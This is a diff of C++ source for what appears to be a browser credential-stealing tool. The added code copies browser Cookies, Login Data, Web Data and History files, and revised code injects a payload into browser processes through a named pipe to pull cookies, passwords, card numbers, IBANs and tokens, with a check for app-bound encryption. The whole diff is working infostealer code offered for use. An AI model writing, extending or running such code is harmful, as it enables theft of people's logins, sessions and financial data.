@@ -20,6 +20,48 @@ struct GlobalStats {
     int skipped = 0;
 };
 
+void ColdExtract(const BrowserInfo& browser, const std::filesystem::path& outputBase, const Core::Console& console) {
+    std::filesystem::path browserOutput = outputBase / browser.displayName;
+    std::filesystem::create_directories(browserOutput);
+
+    console.Info("Performing Cold Extraction (File Copy Only)...");
+
+    std::vector<std::wstring> filesToCopy = {
+        L"Cookies", L"Login Data", L"Web Data", L"History", L"Local State"
+    };
+
+    try {
+        if (!std::filesystem::exists(browser.userDataPath)) {
+            console.Error("User data path does not exist: " + Core::ToUtf8(browser.userDataPath));
+            return;
+        }
+
+        for (const auto& entry : std::filesystem::recursive_directory_iterator(browser.userDataPath)) {
+            if (entry.is_regular_file()) {
+                std::wstring fileName = entry.path().filename().wstring();
+                bool shouldCopy = false;
+                for (const auto& target : filesToCopy) {
+                    if (fileName == target) {
+                        shouldCopy = true;
+                        break;
+                    }
+                }
+
+                if (shouldCopy) {
+                    std::filesystem::path relative = std::filesystem::relative(entry.path(), browser.userDataPath);
+                    std::filesystem::path destination = browserOutput / relative;
+                    std::filesystem::create_directories(destination.parent_path());
+                    
+                    std::filesystem::copy_file(entry.path(), destination, std::filesystem::copy_options::overwrite_existing);
+                    console.Debug("  [+] Copied: " + Core::ToUtf8(relative.wstring()));
+                }
+            }
+        }
+    } catch (const std::exception& e) {
+        console.Error("Cold extraction failed: " + std::string(e.what()));
+    }
+}
+
 DWORD FindProcessByName(const std::wstring& name) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
@@ -45,6 +87,12 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
                     const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
     
     console.BrowserHeader(browser.displayName, browser.version);
+
+    if (browser.isColdOnly) {
+        ColdExtract(browser, output, console);
+        stats.successful++; 
+        return;
+    }
 
     try {
         if (killFirst) {
@@ -90,22 +138,26 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
         injector.Inject(pipe.GetName());
 
         console.Debug("Awaiting payload connection...");
-        pipe.WaitForClient();
-        console.Debug("  [+] Payload connected");
-        
-        pipe.SendConfig(verbose, fingerprint, output, browser.userDataPath, browser.isGecko);
-        pipe.ProcessMessages(verbose);
-        
-        auto pStats = pipe.GetStats();
-        if (pStats.noAbe) {
-            // ABE not enabled - not a failure, just skip
-            stats.skipped++;
-        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
-            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
-                           pStats.profiles, (output / browser.displayName).string());
-            stats.successful++;
+        if (pipe.WaitForClient(15000)) {
+            console.Debug("  [+] Payload connected");
+            
+            pipe.SendConfig(verbose, fingerprint, output, browser.userDataPath, browser.isGecko);
+            pipe.ProcessMessages(verbose);
+            
+            auto pStats = pipe.GetStats();
+            if (pStats.noAbe) {
+                // ABE not enabled - not a failure, just skip
+                stats.skipped++;
+            } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
+                console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
+                               pStats.profiles, (output / browser.displayName).string());
+                stats.successful++;
+            } else {
+                console.Warn("No data extracted");
+                stats.failed++;
+            }
         } else {
-            console.Warn("No data extracted");
+            console.Warn("Payload connection timed out (AppContainer/Sandbox?)");
             stats.failed++;
         }
         
